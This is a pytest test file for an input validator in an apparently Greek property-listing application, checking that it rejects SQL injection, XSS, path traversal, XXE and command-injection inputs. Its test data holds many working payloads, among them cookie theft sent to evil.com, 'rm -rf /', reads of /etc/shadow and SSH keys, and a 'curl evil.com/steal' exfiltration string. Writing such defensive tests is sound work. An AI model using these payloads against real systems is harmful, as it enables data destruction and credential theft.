"""
Security Testing Suite for Input Validator
Tests for injection prevention, XSS protection, and data sanitization
"""

import pytest
from datetime import datetime, timedelta
from pathlib import Path
import tempfile
from typing import Dict, Any

from src.security.input_validator import (
    InputValidator, ValidationResult, SecurityError,
    get_validator, validate_property_data, sanitize_for_database
)


class TestSQLInjectionPrevention:
    """Test SQL injection attack prevention"""

    @pytest.fixture
    def validator(self):
        return InputValidator()

    def test_property_id_sql_injection_prevention(self, validator):
        """Test SQL injection prevention in property ID validation"""
        malicious_ids = [
            "'; DROP TABLE properties; --",
            "1 OR 1=1",
            "admin'--",
            "1; DELETE FROM users; --",
            "property_123' UNION SELECT * FROM passwords --",
            "'; INSERT INTO admins VALUES('hacker', 'password'); --",
            "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0"
        ]
        
        for malicious_id in malicious_ids:
            result = validator.validate_property_id(malicious_id)
            
            # Should be invalid
            assert not result.is_valid, f"Failed to detect SQL injection: {malicious_id}"
            assert any("malicious content" in error for error in result.errors)

    def test_text_field_sql_injection_prevention(self, validator):
        """Test SQL injection prevention in text fields"""
        malicious_texts = [
            "Beautiful apartment'; DROP TABLE properties; --",
            "Great location' OR '1'='1",
            "Modern house' UNION SELECT password FROM users --",
            "Description with '; DELETE FROM listings; --",
        ]
        
        for malicious_text in malicious_texts:
            result = validator.validate_text(malicious_text, "description")
            
            # Should be invalid due to SQL injection patterns
            assert not result.is_valid, f"Failed to detect SQL injection: {malicious_text}"
            assert any("malicious SQL content" in error for error in result.errors)

    def test_url_sql_injection_prevention(self, validator):
        """Test SQL injection prevention in URL validation"""
        malicious_urls = [
            "https://example.com/property?id=1'; DROP TABLE properties; --",
            "https://spitogatos.gr/listing?search=' UNION SELECT * FROM users --",
            "https://xe.gr/property/' OR 1=1 --"
        ]
        
        for malicious_url in malicious_urls:
            result = validator.validate_url(malicious_url)
            
            # Should be invalid
            assert not result.is_valid, f"Failed to detect SQL injection in URL: {malicious_url}"

    def test_date_sql_injection_prevention(self, validator):
        """Test SQL injection prevention in date validation"""
        malicious_dates = [
            "2024-01-01'; DROP TABLE listings; --",
            "2024-01-01' OR '1'='1",
            "'; DELETE FROM properties WHERE id=1; --"
        ]
        
        for malicious_date in malicious_dates:
            result = validator.validate_date(malicious_date)
            
            # Should be invalid
            assert not result.is_valid, f"Failed to detect SQL injection in date: {malicious_date}"
            assert any("malicious content" in error for error in result.errors)

    def test_legitimate_content_passes(self, validator):
        """Test that legitimate content passes SQL injection checks"""
        legitimate_content = [
            ("Property ID", "property_123_valid"),
            ("Description", "Beautiful 2-bedroom apartment in downtown Athens"),
            ("Location", "Kolonaki, Athens Center"),
            ("Date", "2024-01-01"),
        ]
        
        for field_type, content in legitimate_content:
            if field_type == "Property ID":
                result = validator.validate_property_id(content)
            elif field_type == "Description":
                result = validator.validate_text(content, "description")
            elif field_type == "Location":
                result = validator.validate_text(content, "location")
            elif field_type == "Date":
                result = validator.validate_date(content)
            
            assert result.is_valid, f"Legitimate {field_type} content failed validation: {content}"


class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) attack prevention"""

    @pytest.fixture
    def validator(self):
        return InputValidator()

    def test_script_tag_prevention(self, validator):
        """Test script tag XSS prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script src='http://malicious.com/xss.js'></script>",
            "<SCRIPT>document.location='http://evil.com'</SCRIPT>",
            "<script>fetch('/api/admin').then(r=>r.text()).then(console.log)</script>"
        ]
        
        for payload in xss_payloads:
            description_with_xss = f"Beautiful apartment {payload} in Athens"
            result = validator.validate_text(description_with_xss, "description")
            
            # Should be invalid
            assert not result.is_valid, f"Failed to detect XSS: {payload}"
            assert any("malicious HTML content" in error for error in result.errors)

    def test_javascript_protocol_prevention(self, validator):
        """Test javascript: protocol XSS prevention"""
        javascript_urls = [
            "javascript:alert('XSS')",
            "javascript:document.location='http://evil.com'",
            "JAVASCRIPT:fetch('/admin')",
            "javascript:void(0)"
        ]
        
        for js_url in javascript_urls:
            url_with_js = f"https://example.com/property?redirect={js_url}"
            result = validator.validate_url(url_with_js)
            
            # Should be invalid
            assert not result.is_valid, f"Failed to detect JS protocol XSS: {js_url}"

    def test_event_handler_prevention(self, validator):
        """Test event handler XSS prevention"""
        event_handlers = [
            "<div onclick='alert(1)'>Click me</div>",
            "<img src='x' onerror='alert(1)'>",
            "<body onload='maliciousFunction()'>",
            "<input onchange='stealData(this.value)'>"
        ]
        
        for handler in event_handlers:
            description_with_handler = f"Property description {handler}"
            result = validator.validate_text(description_with_handler, "description")
            
            # Should be invalid
            assert not result.is_valid, f"Failed to detect event handler XSS: {handler}"

    def test_iframe_embed_prevention(self, validator):
        """Test iframe/embed tag XSS prevention"""
        dangerous_tags = [
            "<iframe src='javascript:alert(1)'></iframe>",
            "<object data='data:text/html,<script>alert(1)</script>'></object>",
            "<embed src='http://malicious.com/exploit.swf'>",
            "<iframe src='http://evil.com/clickjacking'></iframe>"
        ]
        
        for tag in dangerous_tags:
            description_with_tag = f"Property info {tag}"
            result = validator.validate_text(description_with_tag, "description")
            
            # Should be invalid
            assert not result.is_valid, f"Failed to detect dangerous tag: {tag}"

    def test_html_escaping(self, validator):
        """Test HTML escaping for safe content"""
        content_with_html = "Price: <b>€250,000</b> & utilities included"
        result = validator.validate_text(content_with_html, "description", allow_html=False)
        
        # Should be valid but escaped
        assert result.is_valid
        assert "&lt;b&gt;" in result.sanitized_value
        assert "&amp;" in result.sanitized_value
        assert result.warnings

    def test_url_xss_prevention(self, validator):
        """Test URL XSS prevention"""
        xss_urls = [
            "https://example.com/search?q=<script>alert(1)</script>",
            "https://spitogatos.gr/property?callback=<img src=x onerror=alert(1)>",
            "https://xe.gr/listing#<svg onload=alert(1)>"
        ]
        
        for xss_url in xss_urls:
            result = validator.validate_url(xss_url)
            
            # Should be invalid
            assert not result.is_valid, f"Failed to detect URL XSS: {xss_url}"


class TestPathTraversalPrevention:
    """Test path traversal attack prevention"""

    @pytest.fixture
    def validator(self):
        return InputValidator()

    @pytest.fixture
    def temp_base_dir(self, tmp_path):
        """Create temporary base directory"""
        base_dir = tmp_path / "safe_uploads"
        base_dir.mkdir()
        return str(base_dir)

    def test_directory_traversal_prevention(self, validator, temp_base_dir):
        """Test directory traversal attack prevention"""
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            ".././.././.././etc/shadow",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam"
        ]
        
        for traversal_path in traversal_paths:
            result = validator.validate_file_path(traversal_path, temp_base_dir)
            
            # Should be invalid
            assert not result.is_valid, f"Failed to detect path traversal: {traversal_path}"
            assert any("traversal" in error.lower() for error in result.errors)

    def test_safe_file_path_validation(self, validator, temp_base_dir):
        """Test safe file path validation"""
        safe_paths = [
            "document.pdf",
            "property_image.jpg",
            "report_2024.xlsx",
            "analysis.csv"
        ]
        
        for safe_path in safe_paths:
            result = validator.validate_file_path(safe_path, temp_base_dir)
            
            # Should be valid and contained within base directory
            assert result.is_valid, f"Safe path rejected: {safe_path}"
            assert str(result.sanitized_value).startswith(temp_base_dir)

    def test_filename_safety_validation(self, validator, temp_base_dir):
        """Test filename safety validation"""
        unsafe_filenames = [
            "file<script>.txt",
            "document|pipe.pdf",
            "file:colon.jpg",
            "file\"quote.png",
            "file*star.doc",
            "file?question.xlsx"
        ]
        
        for unsafe_filename in unsafe_filenames:
            result = validator.validate_file_path(unsafe_filename, temp_base_dir)
            
            # Should be invalid due to unsafe characters
            assert not result.is_valid, f"Unsafe filename allowed: {unsafe_filename}"

    def test_absolute_path_prevention(self, validator, temp_base_dir):
        """Test absolute path prevention"""
        absolute_paths = [
            "/etc/passwd",
            "/var/log/system.log",
            "C:\\Windows\\System32\\config\\SAM",
            "/home/user/.ssh/id_rsa"
        ]
        
        for abs_path in absolute_paths:
            result = validator.validate_file_path(abs_path, temp_base_dir)
            
            # Should be valid but sanitized to just filename
            if result.is_valid:
                # Should only contain filename, not full path
                assert not str(result.sanitized_value).startswith("/")
                assert not str(result.sanitized_value).startswith("C:")


class TestNumericValidation:
    """Test numeric input validation and boundaries"""

    @pytest.fixture
    def validator(self):
        return InputValidator()

    def test_price_validation(self, validator):
        """Test property price validation"""
        # Valid prices
        valid_prices = [150000, 250000.50, "300000", "450000.75"]
        for price in valid_prices:
            result = validator.validate_numeric(price, "price", min_value=1000, max_value=50000000)
            assert result.is_valid, f"Valid price rejected: {price}"

        # Invalid prices
        invalid_prices = [
            (-100000, "negative price"),
            (0, "zero price"),
            ("not_a_number", "string price"),
            (float('inf'), "infinite price"),
            (float('nan'), "NaN price"),
            (100000000, "excessive price")
        ]
        
        for price, description in invalid_prices:
            result = validator.validate_numeric(price, "price", min_value=1000, max_value=50000000)
            assert not result.is_valid, f"Invalid price accepted: {price} ({description})"

    def test_size_validation(self, validator):
        """Test property size validation"""
        # Valid sizes
        valid_sizes = [50.5, 85, 120.75, "95"]
        for size in valid_sizes:
            result = validator.validate_numeric(size, "size", min_value=10, max_value=2000)
            assert result.is_valid, f"Valid size rejected: {size}"

        # Invalid sizes  
        invalid_sizes = [
            (-10, "negative size"),
            (0, "zero size"), 
            (3000, "excessive size"),
            ("invalid", "string size")
        ]
        
        for size, description in invalid_sizes:
            result = validator.validate_numeric(size, "size", min_value=10, max_value=2000)
            assert not result.is_valid, f"Invalid size accepted: {size} ({description})"

    def test_room_count_validation(self, validator):
        """Test room count validation (integer only)"""
        # Valid room counts
        valid_rooms = [1, 2, 3, 4, 5, "3"]
        for rooms in valid_rooms:
            result = validator.validate_numeric(rooms, "rooms", min_value=1, max_value=20, allow_decimal=False)
            assert result.is_valid, f"Valid room count rejected: {rooms}"
            assert isinstance(result.sanitized_value, int), f"Room count not converted to int: {rooms}"

        # Invalid room counts
        invalid_rooms = [
            (0, "zero rooms"),
            (2.5, "fractional rooms with decimal disabled"),
            (25, "too many rooms"),
            ("not_number", "string rooms")
        ]
        
        for rooms, description in invalid_rooms:
            result = validator.validate_numeric(rooms, "rooms", min_value=1, max_value=20, allow_decimal=False)
            assert not result.is_valid, f"Invalid room count accepted: {rooms} ({description})"

    def test_overflow_prevention(self, validator):
        """Test numeric overflow prevention"""
        large_numbers = [
            999999999999999999999999999999,  # Very large integer
            1.7976931348623157e+308,         # Near float max
            "999999999999999999999999999999999999999"  # String with many digits
        ]
        
        for large_num in large_numbers:
            try:
                result = validator.validate_numeric(large_num, "test_field", max_value=1000000000)
                # If it doesn't raise an exception, it should at least fail validation
                if result.is_valid:
                    # Should trigger max_value validation
                    assert result.sanitized_value <= 1000000000
            except (OverflowError, ValueError):
                # Expected for extremely large values
                pass


class TestDateValidation:
    """Test date validation and security"""

    @pytest.fixture
    def validator(self):
        return InputValidator()

    def test_valid_date_formats(self, validator):
        """Test valid date format acceptance"""
        valid_dates = [
            "2024-01-01",
            "2024-12-31",
            "2024-01-01T10:30:00",
            "2024-01-01T10:30:00Z",
            "2024-01-01T10:30:00+02:00",
            datetime(2024, 1, 1),
            datetime.now()
        ]
        
        for date_val in valid_dates:
            result = validator.validate_date(date_val)
            assert result.is_valid, f"Valid date rejected: {date_val}"

    def test_invalid_date_formats(self, validator):
        """Test invalid date format rejection"""
        invalid_dates = [
            "2024-13-01",      # Invalid month
            "2024-01-32",      # Invalid day
            "2024-02-30",      # Invalid date for February
            "24-01-01",        # Wrong year format
            "2024/01/01",      # Wrong separator
            "January 1, 2024", # Text format
            "not_a_date",      # Garbage input
        ]
        
        for date_val in invalid_dates:
            result = validator.validate_date(date_val)
            assert not result.is_valid, f"Invalid date accepted: {date_val}"

    def test_date_injection_prevention(self, validator):
        """Test date field injection attack prevention"""
        injection_dates = [
            "2024-01-01'; DROP TABLE dates; --",
            "2024-01-01<script>alert('xss')</script>",
            "2024-01-01\\x41\\x42\\x43",  # Hex encoded
            "2024-01-01%41%42%43",        # URL encoded
            "2024-01-01\\u0041\\u0042\\u0043",  # Unicode escaped
            "2024-01-01\x00\x01\x02",    # Control characters
            "2024-01-01javascript:alert(1)",
            "2024-01-01vbscript:msgbox(1)",
            "2024-01-01onload=alert(1)"
        ]
        
        for injection_date in injection_dates:
            result = validator.validate_date(injection_date)
            assert not result.is_valid, f"Date injection not detected: {injection_date}"

    def test_date_range_validation(self, validator):
        """Test date range validation"""
        # Dates too far in future (more than 10 years)
        future_date = datetime.now() + timedelta(days=4000)  # ~11 years
        result = validator.validate_date(future_date.isoformat())
        assert not result.is_valid, "Excessive future date accepted"
        
        # Dates too far in past (before 1900)
        past_date = "1850-01-01"
        result = validator.validate_date(past_date)
        assert not result.is_valid, "Excessive past date accepted"

    def test_date_component_validation(self, validator):
        """Test individual date component validation"""
        invalid_components = [
            "2024-00-01",  # Month 0
            "2024-13-01",  # Month 13
            "2024-01-00",  # Day 0
            "2024-01-32",  # Day 32
        ]
        
        for invalid_date in invalid_components:
            result = validator.validate_date(invalid_date)
            assert not result.is_valid, f"Invalid date component accepted: {invalid_date}"


class TestEnergyDataValidation:
    """Test energy assessment data validation"""

    @pytest.fixture
    def validator(self):
        return InputValidator()

    def test_energy_class_validation(self, validator):
        """Test energy class validation"""
        valid_classes = ['A+', 'A', 'B+', 'B', 'C', 'D', 'E', 'F', 'G']
        
        for energy_class in valid_classes:
            energy_data = {'energy_class': energy_class}
            result = validator.validate_energy_data(energy_data)
            assert result.is_valid
            assert result.sanitized_value['energy_class'] == energy_class

        # Test case normalization
        lowercase_data = {'energy_class': 'a+'}
        result = validator.validate_energy_data(lowercase_data)
        assert result.is_valid
        assert result.sanitized_value['energy_class'] == 'A+'

    def test_heating_system_validation(self, validator):
        """Test heating system validation"""
        valid_systems = ['oil', 'gas', 'electric', 'heat_pump', 'solar']
        
        for system in valid_systems:
            energy_data = {'heating_system': system}
            result = validator.validate_energy_data(energy_data)
            assert result.is_valid
            assert result.sanitized_value['heating_system'] == system

        # Test case normalization
        uppercase_data = {'heating_system': 'ELECTRIC'}
        result = validator.validate_energy_data(uppercase_data)
        assert result.is_valid
        assert result.sanitized_value['heating_system'] == 'electric'

    def test_boolean_field_validation(self, validator):
        """Test boolean field validation for energy features"""
        bool_fields = ['insulation_walls', 'insulation_roof', 'solar_panels']
        
        for field in bool_fields:
            # Test actual boolean values
            for bool_val in [True, False]:
                energy_data = {field: bool_val}
                result = validator.validate_energy_data(energy_data)
                assert result.is_valid
                assert result.sanitized_value[field] == bool_val
            
            # Test string boolean conversion
            string_bools = [
                ('true', True), ('True', True), ('1', True), ('yes', True),
                ('false', False), ('False', False), ('0', False), ('no', False)
            ]
            
            for str_val, expected_bool in string_bools:
                energy_data = {field: str_val}
                result = validator.validate_energy_data(energy_data)
                assert result.is_valid
                assert result.sanitized_value[field] == expected_bool

    def test_unknown_energy_values_handling(self, validator):
        """Test handling of unknown energy values"""
        unknown_data = {
            'energy_class': 'Z',  # Unknown class
            'heating_system': 'unknown_system',  # Unknown system
            'invalid_boolean': 'maybe'  # Invalid boolean
        }
        
        result = validator.validate_energy_data(unknown_data)
        
        # Should be valid but with warnings
        assert result.is_valid
        assert len(result.warnings) >= 2  # At least warnings for unknown values
        
        # Unknown values should not be in sanitized data
        assert 'energy_class' not in result.sanitized_value
        assert 'heating_system' not in result.sanitized_value


class TestComprehensivePropertyValidation:
    """Test comprehensive property data validation"""

    @pytest.fixture
    def validator(self):
        return InputValidator()

    def test_valid_property_data_validation(self, validator):
        """Test validation of complete valid property data"""
        valid_property_data = {
            'id': 'property_12345',
            'url': 'https://spitogatos.gr/property/12345',
            'price': 350000,
            'size': 85.5,
            'rooms': 3,
            'floor': 2,
            'year_built': 2010,
            'location': 'Kolonaki, Athens',
            'description': 'Beautiful apartment with modern amenities',
            'address': '123 Main Street, Athens',
            'listed_date': '2024-01-01',
            'energy_class': 'B',
            'heating_system': 'gas',
            'insulation_walls': True,
            'insulation_roof': False,
            'solar_panels': True
        }
        
        results = validator.validate_property_data(valid_property_data)
        
        # All validations should pass
        for field, result in results.items():
            assert result.is_valid, f"Valid property field failed: {field} - {result.errors}"

    def test_malicious_property_data_validation(self, validator):
        """Test validation of property data with malicious content"""
        malicious_property_data = {
            'id': "'; DROP TABLE properties; --",
            'url': 'javascript:alert("XSS")',
            'price': "'; DELETE FROM listings; --",
            'description': '<script>steal_data()</script>',
            'location': '../../../etc/passwd',
            'listed_date': "2024-01-01'; DROP TABLE dates; --"
        }
        
        results = validator.validate_property_data(malicious_property_data)
        
        # All malicious inputs should be invalid
        for field, result in results.items():
            assert not result.is_valid, f"Malicious input accepted for field: {field}"

    def test_edge_case_property_validation(self, validator):
        """Test edge cases in property validation"""
        edge_cases = {
            'price': [0, -1000, 999999999999],  # Boundary prices
            'size': [0, -50, 10000],           # Boundary sizes
            'rooms': [0, 100],                 # Boundary room counts
            'floor': [-10, 100],               # Boundary floors
            'year_built': [1500, 2050]         # Boundary years
        }
        
        for field, values in edge_cases.items():
            for value in values:
                property_data = {field: value}
                results = validator.validate_property_data(property_data)
                
                if field in results:
                    result = results[field]
                    # Edge cases should generally be invalid
                    if field == 'price' and value <= 0:
                        assert not result.is_valid, f"Invalid {field} value accepted: {value}"
                    elif field == 'size' and value <= 0:
                        assert not result.is_valid, f"Invalid {field} value accepted: {value}"


class TestValidationErrorHandling:
    """Test validation error handling and security"""

    def test_security_error_raising(self):
        """Test SecurityError raising for critical failures"""
        malicious_data = {
            'id': "'; DROP TABLE properties; --",
            'url': 'javascript:alert("XSS")'
        }
        
        with pytest.raises(SecurityError) as exc_info:
            validate_property_data(malicious_data)
        
        assert "Critical validation failures" in str(exc_info.value)

    def test_database_sanitization(self):
        """Test database sanitization function"""
        test_cases = [
            ("id", "property_123", "property_123"),
            ("url", "https://example.com/test", "https://example.com/test"),
            ("description", "Nice apartment & good location", "Nice apartment &amp; good location")
        ]
        
        for field_name, input_value, expected_pattern in test_cases:
            try:
                sanitized = sanitize_for_database(input_value, field_name)
                # Should not raise exception for valid input
                assert sanitized is not None
            except SecurityError:
                pytest.fail(f"Valid input rejected for {field_name}: {input_value}")

    def test_malicious_database_sanitization(self):
        """Test database sanitization with malicious input"""
        malicious_inputs = [
            ("id", "'; DROP TABLE properties; --"),
            ("url", "javascript:alert('XSS')"),
            ("description", "<script>steal_data()</script>")
        ]
        
        for field_name, malicious_value in malicious_inputs:
            with pytest.raises(SecurityError):
                sanitize_for_database(malicious_value, field_name)

    def test_global_validator_instance(self):
        """Test global validator singleton"""
        validator1 = get_validator()
        validator2 = get_validator()
        
        # Should return same instance
        assert validator1 is validator2


class TestValidationPerformance:
    """Test validation performance and DoS prevention"""

    @pytest.fixture
    def validator(self):
        return InputValidator()

    def test_large_input_handling(self, validator):
        """Test handling of large inputs to prevent DoS"""
        # Very long string
        large_text = "A" * 100000
        result = validator.validate_text(large_text, "description", max_length=1000)
        
        # Should be invalid due to length
        assert not result.is_valid
        assert any("too long" in error for error in result.errors)

    def test_regex_performance(self, validator):
        """Test regex performance with crafted inputs"""
        import time
        
        # Inputs designed to cause regex backtracking
        backtracking_inputs = [
            "a" * 1000 + "!",
            "'" * 500 + "x",
            "<" + "script" * 100 + ">",
            "/" + ".." * 200 + "/"
        ]
        
        for malicious_input in backtracking_inputs:
            start_time = time.perf_counter()
            
            # Test various validation methods
            validator.validate_text(malicious_input, "test_field")
            validator.validate_property_id(malicious_input)
            validator.validate_url(f"https://example.com/{malicious_input}")
            
            elapsed = time.perf_counter() - start_time
            
            # Should not take excessive time (prevent ReDoS)
            assert elapsed < 1.0, f"Validation took too long: {elapsed:.2f}s for input length {len(malicious_input)}"

    @pytest.mark.slow
    def test_validation_throughput(self, validator):
        """Test validation throughput under load"""
        import time
        
        # Test data
        test_properties = []
        for i in range(1000):
            test_properties.append({
                'id': f'property_{i}',
                'price': 200000 + i * 1000,
                'size': 80 + i * 0.5,
                'description': f'Property {i} description'
            })
        
        start_time = time.perf_counter()
        
        # Validate all properties
        for prop_data in test_properties:
            results = validator.validate_property_data(prop_data)
        
        elapsed = time.perf_counter() - start_time
        throughput = len(test_properties) / elapsed
        
        # Should achieve reasonable throughput
        assert throughput > 100, f"Low validation throughput: {throughput:.1f} validations/sec"


# Parametrized security tests
@pytest.mark.parametrize("injection_type,payload", [
    ("SQL", "'; DROP TABLE users; --"),
    ("XSS", "<script>alert('XSS')</script>"),
    ("Path", "../../../etc/passwd"),
    ("Command", "; rm -rf /"),
    ("LDAP", ")(uid=*"),
    ("XML", "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>")
])
def test_injection_prevention_comprehensive(injection_type, payload):
    """Test comprehensive injection prevention"""
    validator = InputValidator()
    
    # Test payload in different contexts
    contexts = [
        ("property_id", lambda v, p: v.validate_property_id(p)),
        ("text", lambda v, p: v.validate_text(p, "test_field")),
        ("url", lambda v, p: v.validate_url(f"https://example.com/{p}")),
        ("date", lambda v, p: v.validate_date(p) if injection_type in ["SQL", "XSS"] else None)
    ]
    
    for context_name, validation_func in contexts:
        if validation_func is None:
            continue
            
        try:
            result = validation_func(validator, payload)
            # Should be invalid for all injection attempts
            assert not result.is_valid, f"{injection_type} injection not detected in {context_name}: {payload}"
        except Exception:
            # Exceptions are also acceptable for malicious input
            pass


# Integration tests
def test_end_to_end_validation_security():
    """Test end-to-end validation security"""
    # Simulate complete malicious property submission
    malicious_property = {
        'id': "'; DROP TABLE properties; DELETE FROM users; --",
        'url': 'javascript:document.location="http://evil.com/"+document.cookie',
        'price': "'; UPDATE listings SET price=1 WHERE id=1; --",
        'size': "<script>fetch('/admin/users').then(r=>r.json()).then(console.log)</script>",
        'rooms': "../../../../../../etc/passwd",
        'description': '<iframe src="javascript:alert(`XSS`)"></iframe>',
        'location': "'; INSERT INTO admins VALUES('hacker','pass'); --",
        'listed_date': "2024-01-01'; DROP DATABASE production; --",
        'energy_class': '<script>location="http://evil.com"</script>',
        'heating_system': '$(rm -rf /)',
        'insulation_walls': 'true; curl evil.com/steal?data=',
    }
    
    # Should raise SecurityError due to critical validation failures
    with pytest.raises(SecurityError) as exc_info:
        validate_property_data(malicious_property)
    
    error_msg = str(exc_info.value)
    assert "Critical validation failures" in error_msg
    assert "id:" in error_msg or "url:" in error_msg  # At least one critical field should fail